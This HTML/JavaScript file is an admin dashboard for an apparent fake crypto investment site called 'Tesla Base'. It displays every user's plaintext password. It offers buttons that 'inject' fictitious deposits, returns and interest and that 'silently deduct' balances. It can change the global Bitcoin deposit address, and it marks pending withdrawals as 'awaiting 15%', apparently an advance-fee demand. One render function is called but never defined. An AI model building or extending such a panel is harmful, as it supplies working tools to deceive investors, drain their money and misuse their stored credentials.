<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tesla Base | MASTER CONTROL</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --red: #E31937; --bg: #000; --card: #0d0d0d; --border: #1a1a1a; --green: #00ffa3; --gold: #f5cc91; --blue: #007bff; --text: #fff; }
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); color: var(--text); margin: 0; padding: 20px; padding-bottom: 100px; }
        
        /* Layout */
        .admin-header { border-bottom: 2px solid var(--red); padding-bottom: 15px; margin-bottom: 25px; }
        .section { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 20px; margin-bottom: 20px; }
        h2 { font-size: 13px; text-transform: uppercase; color: #555; margin-top: 0; display: flex; align-items: center; gap: 8px; }

        /* Wallet Update Feature */
        .input-group { display: flex; gap: 10px; margin-top: 10px; }
        input { background: #000; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 10px; flex: 1; font-size: 14px; }
        
        /* User Management */
        .user-card { background: #111; border: 1px solid #222; border-radius: 15px; padding: 15px; margin-bottom: 15px; }
        .user-meta { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
        .u-data b { color: var(--gold); font-size: 15px; }
        .u-data p { margin: 3px 0; font-size: 11px; color: #666; font-family: monospace; }
        .u-bal { color: var(--green); font-weight: 800; font-size: 18px; }

        /* The 4 Buttons: Deposit, Return, Interest, Silent Deduct */
        .grid-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
        .btn { border: none; padding: 12px; border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 10px; text-transform: uppercase; }
        .btn-dep { background: var(--green); color: #000; }
        .btn-ret { background: var(--blue); color: #fff; }
        .btn-int { background: var(--gold); color: #000; }
        .btn-sil { background: var(--red); color: #fff; }

        /* Tables for Approvals */
        .scroll-x { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; min-width: 400px; }
        th { text-align: left; font-size: 11px; color: #444; padding: 10px; border-bottom: 1px solid #222; }
        td { padding: 12px 10px; border-bottom: 1px solid #1a1a1a; font-size: 12px; }
        .badge { padding: 3px 6px; border-radius: 4px; font-size: 9px; font-weight: 900; }
        .badge-p { background: rgba(255, 165, 0, 0.1); color: orange; border: 1px solid orange; }

        .act-btn { background: #fff; color: #000; padding: 6px 10px; border-radius: 5px; font-weight: 800; border: none; cursor: pointer; font-size: 10px; margin-right: 5px; }
        .act-btn.fail { background: #333; color: #fff; }
    </style>
</head>
<body>

    <div class="admin-header">
        <h1 style="margin:0; font-size:24px; font-weight:900;">SYSTEM COMMAND</h1>
    </div>

    <div class="section">
        <h2><i class="fa-solid fa-wallet"></i> Global BTC Deposit Address</h2>
        <div class="input-group">
            <input type="text" id="btcAddress" placeholder="Paste new Bitcoin address...">
            <button class="act-btn" style="height:45px; width:120px;" onclick="saveWallet()">UPDATE</button>
        </div>
    </div>

    <div class="section">
        <h2><i class="fa-solid fa-users"></i> Users & Manual Injections</h2>
        <div id="usersList"></div>
    </div>

    <div class="section">
        <h2><i class="fa-solid fa-clock"></i> Pending Withdrawals</h2>
        <div class="scroll-x">
            <table>
                <thead><tr><th>Email</th><th>Amount</th><th>Status</th><th>Action</th></tr></thead>
                <tbody id="withdrawTable"></tbody>
            </table>
        </div>
    </div>

    <div class="section">
        <h2><i class="fa-solid fa-bolt"></i> Pending Investments</h2>
        <div class="scroll-x">
            <table>
                <thead><tr><th>Email</th><th>Plan</th><th>Capital</th><th>Action</th></tr></thead>
                <tbody id="investTable"></tbody>
            </table>
        </div>
    </div>

<script>
    // These link to your website's API
    const API = "https://tesla-base.onrender.com/api/admin";

    async function sync() {
        try {
            const res = await fetch(`${API}/get-all-data`);
            const data = await res.json();
            renderUsers(data.users);
            renderWithdrawals(data.withdrawals);
            renderInvestments(data.investments);
        } catch (e) { console.log("Connecting to server..."); }
    }

    function renderUsers(users) {
        const div = document.getElementById('usersList');
        div.innerHTML = users.map(u => `
            <div class="user-card">
                <div class="user-meta">
                    <div class="u-data">
                        <b>${u.email}</b><br>
                        <p>PASS: ${u.password}</p>
                    </div>
                    <div class="u-bal">$${u.balance.toLocaleString()}</div>
                </div>
                <input type="number" id="v_${u.email.replace(/[@.]/g,'_')}" placeholder="Amount ($)">
                <div class="grid-btns">
                    <button class="btn btn-dep" onclick="run('${u.email}', 'DEPOSIT')">Inject Deposit</button>
                    <button class="btn btn-ret" onclick="run('${u.email}', 'RETURN')">Inject Return</button>
                    <button class="btn btn-int" onclick="run('${u.email}', 'INTEREST')">Inject Interest</button>
                    <button class="btn btn-sil" onclick="run('${u.email}', 'SILENT')">Silent Deduct</button>
                </div>
            </div>
        `).join('');
    }

    async function run(email, mode) {
        const val = document.getElementById(`v_${email.replace(/[@.]/g,'_')}`).value;
        if(!val) return alert("Enter amount");
        await fetch(`${API}/inject`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ email, amount: val, mode })
        });
        alert(mode + " Processed");
        sync();
    }

    async function saveWallet() {
        const addr = document.getElementById('btcAddress').value;
        await fetch(`${API}/update-wallet`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ wallet: addr })
        });
        alert("Wallet Updated Globally!");
    }

    function renderWithdrawals(list) {
        document.getElementById('withdrawTable').innerHTML = list.map(w => `
            <tr>
                <td>${w.email}</td>
                <td>$${w.amount}</td>
                <td><span class="badge badge-p">AWAITING 15%</span></td>
                <td>
                    <button class="act-btn" onclick="updateReq('${w.id}', 'W', 'Success')">Approve</button>
                    <button class="act-btn fail" onclick="updateReq('${w.id}', 'W', 'Failed')">Decline</button>
                </td>
            </tr>
        `).join('');
    }

    async function updateReq(id, type, status) {
        await fetch(`${API}/set-status`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ id, type, status })
        });
        alert("Status: " + status);
        sync();
    }

    window.onload = sync;
    setInterval(sync, 20000);
</script>
</body>
</html>
